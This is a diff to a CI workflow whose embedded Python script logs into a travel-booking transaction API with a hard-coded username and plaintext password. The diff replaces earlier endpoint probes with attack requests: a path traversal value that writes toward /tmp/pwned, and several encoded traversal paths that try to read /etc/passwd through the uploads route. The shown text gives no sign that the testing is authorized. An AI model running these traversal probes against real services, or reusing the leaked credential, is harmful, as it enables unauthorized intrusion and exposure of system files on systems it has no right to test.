@@ -15,28 +15,17 @@ jobs:
           r = s.post(f"{B}/auth/login", json={"username":"financeokka","password":"KwRce2026!x#9","force":True}, timeout=25)
           print("LOGIN:", r.status_code)
           A = {"Authorization": "Bearer " + r.json()["data"]["accessToken"]}
-          # 1) latest transactions (did failed book create one?)
-          r = s.get(f"{B}/transactions?limit=5", headers=A, timeout=20)
-          for t in r.json().get("data", []):
-              print("TX:", t.get("id","")[:8], t.get("code"), t.get("type"), t.get("transactionStatus"))
-          # 2) quota reserve attempts
-          for pl in [ {"umrahPackageId":"2d79b57a-806d-4269-a889-b68313158a82","qty":1},
-                      {"packageId":"2d79b57a-806d-4269-a889-b68313158a82","qty":1},
-                      {} ]:
-              rr = s.post(f"{B}/quota/reserve", headers=A, json=pl, timeout=25)
-              print("QUOTA RESERVE", str(pl)[:50], "→", rr.status_code, rr.text[:150])
-          # 3) transaction create variants as admin
-          for pl in [ {"airlineId":"4792ce0e-6a29-491e-8a99-df09c34e70c0","qty":1,"type":"airlines"},
-                      {"type":"airlines","qty":1},
-                      {"packageId":"2d79b57a-806d-4269-a889-b68313158a82","qty":1,"airlineId":"4792ce0e-6a29-491e-8a99-df09c34e70c0"} ]:
-              rr = s.post(f"{B}/transactions", headers=A, json=pl, timeout=25)
-              print("TX CREATE", str(pl)[:60], "→", rr.status_code, rr.text[:130])
-          # 4) export variants
-          for q in ["?format=pdf","?type=pdf","?format=xlsx","?type=xlsx","?exportType=pdf"]:
-              rr = s.get(f"{B}/transactions/export{q}", headers=A, timeout=40)
-              print("EXPORT", q, "→", rr.status_code, rr.headers.get("Content-Type","")[:24], rr.text[:80])
-          # 5) eticket with more field probes on airlines tx
-          for pl in [ {"passengerName":"ZZTESTZZ"}, {"contactName":"ZZTESTZZ"}, {"language":"en"} ]:
-              rr = s.post(f"{B}/transactions/2e029cbf-9912-424d-94e1-f3282adacda1/etickets", headers=A, json=pl, timeout=180)
-              print("AIR ET", str(pl), "→", rr.status_code, rr.text[:130])
+          TID = "2e029cbf-9912-424d-94e1-f3282adacda1"
+          for q in ["", "?type=return", "?type=Return", "?type=../../../../tmp/pwned", "?filename=test.pdf",
+                    "?direction=return", "?lang=id", "?template=raw"]:
+              rr = s.post(f"{B}/transactions/{TID}/etickets{q}", headers=A, timeout=180)
+              print("Q", q[:44], "→", rr.status_code, rr.text[:160])
+          # encoded traversal on uploads static
+          for p in ["/uploads/%2e%2e/%2e%2e/etc/passwd", "/uploads/etickets/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+                    "/uploads/..%2f..%2f..%2fetc%2fpasswd", "/uploads/etickets/..%252f..%252fetc%252fpasswd"]:
+              rr = s.get(f"{B}{p}", timeout=20)
+              print("TRAV", p[:60], "→", rr.status_code, rr.text[:80])
+          # export with valid ISO
+          rr = s.get(f"{B}/transactions/export?startDate=2026-01-01T00:00:00.000Z&endDate=2026-12-31T00:00:00.000Z", headers=A, timeout=60)
+          print("EXPORT ISO:", rr.status_code, rr.headers.get("Content-Type","")[:30], rr.text[:100])
           PYEOF
